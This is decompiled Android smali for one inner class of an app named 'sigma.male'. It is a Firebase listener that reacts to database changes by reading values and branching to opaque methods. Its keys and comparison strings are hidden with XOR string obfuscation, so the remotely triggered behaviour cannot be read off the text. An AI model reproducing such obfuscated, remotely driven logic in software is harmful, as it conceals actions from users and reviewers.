.class Lsigma/male/MainActivity$23;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Lcom/google/firebase/database/ChildEventListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/MainActivity;->_pihtest()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lsigma/male/MainActivity;


# direct methods
.method constructor <init>(Lsigma/male/MainActivity;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    .line 774
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onCancelled(Lcom/google/firebase/database/DatabaseError;)V
    .locals 0

    .prologue
    .line 815
    return-void
.end method

.method public onChildAdded(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 776
    return-void
.end method

.method public onChildChanged(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 781
    invoke-virtual {p1}, Lcom/google/firebase/database/DataSnapshot;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map;

    .line 782
    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiQw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/MainActivity;->access$9(Lsigma/male/MainActivity;Ljava/lang/String;)V

    .line 783
    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiWw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/MainActivity;->access$10(Lsigma/male/MainActivity;Ljava/lang/String;)V

    .line 784
    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiW1kn"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/MainActivity;->access$11(Lsigma/male/MainActivity;Ljava/lang/String;)V

    .line 785
    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiW1knZg=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lsigma/male/MainActivity;->access$12(Lsigma/male/MainActivity;Ljava/lang/String;)V

    .line 787
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v0}, Lsigma/male/MainActivity;->access$13(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "OD0lX102"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 788
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v1}, Lsigma/male/MainActivity;->access$14(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lsigma/male/MainActivity;->_remicbje(Ljava/lang/String;Ljava/lang/String;)V

    .line 789
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    const-string v1, "MT0nQVcyIi9ITw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v3, "GD0lDUowNylfXDw6IQ1rITU0WV0x"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    invoke-virtual/range {v0 .. v5}, Lsigma/male/MainActivity;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 805
    :goto_0
    return-void

    .line 792
    :cond_0
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v0}, Lsigma/male/MainActivity;->access$13(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NiE1WQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 793
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v1}, Lsigma/male/MainActivity;->access$15(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    iget-object v3, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v3}, Lsigma/male/MainActivity;->access$14(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v4}, Lsigma/male/MainActivity;->access$16(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    invoke-virtual/range {v0 .. v5}, Lsigma/male/MainActivity;->_snotiow(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 798
    :cond_1
    iget-object v0, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    iget-object v1, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v1}, Lsigma/male/MainActivity;->access$15(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Mz0qSAJ6e2lMVjEmKURcCjU1Xl0hezFIWiY9MkhLeg=="

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v4}, Lsigma/male/MainActivity;->access$14(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lsigma/male/MainActivity$23;->this$0:Lsigma/male/MainActivity;

    invoke-static {v4}, Lsigma/male/MainActivity;->access$16(Lsigma/male/MainActivity;)Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    invoke-virtual/range {v0 .. v5}, Lsigma/male/MainActivity;->_snotiow(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public onChildMoved(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 812
    return-void
.end method

.method public onChildRemoved(Lcom/google/firebase/database/DataSnapshot;)V
    .locals 0

    .prologue
    .line 810
    return-void
.end method
